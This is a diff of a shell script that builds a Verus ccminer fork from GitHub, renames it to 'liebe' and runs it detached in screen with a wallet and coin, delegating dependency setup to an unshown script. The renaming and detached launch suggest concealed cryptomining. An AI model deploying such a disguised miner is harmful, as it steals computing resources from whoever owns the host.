@@ -29,15 +29,11 @@ echo "Coin : $coin"
 echo "Worker : $1"
 echo "Cpu Core : $core"
 echo "===================================================="
-#!/usr/bin/expect
-spawn sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-expect "password"
-send "y\n"
-interact
+chmod +x engine_maker.sh
+./engine_maker.sh
 git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
 mv ccminer/ liebe
 cd liebe && chmod +x build.sh configure.sh autogen.sh && ./build.sh
 mv ccminer liebe
-sudo apt install screen -y
-echo "on poin===================================="
+cd ..
 screen -d -m ./liebe.sh $1 $core $walet $coin
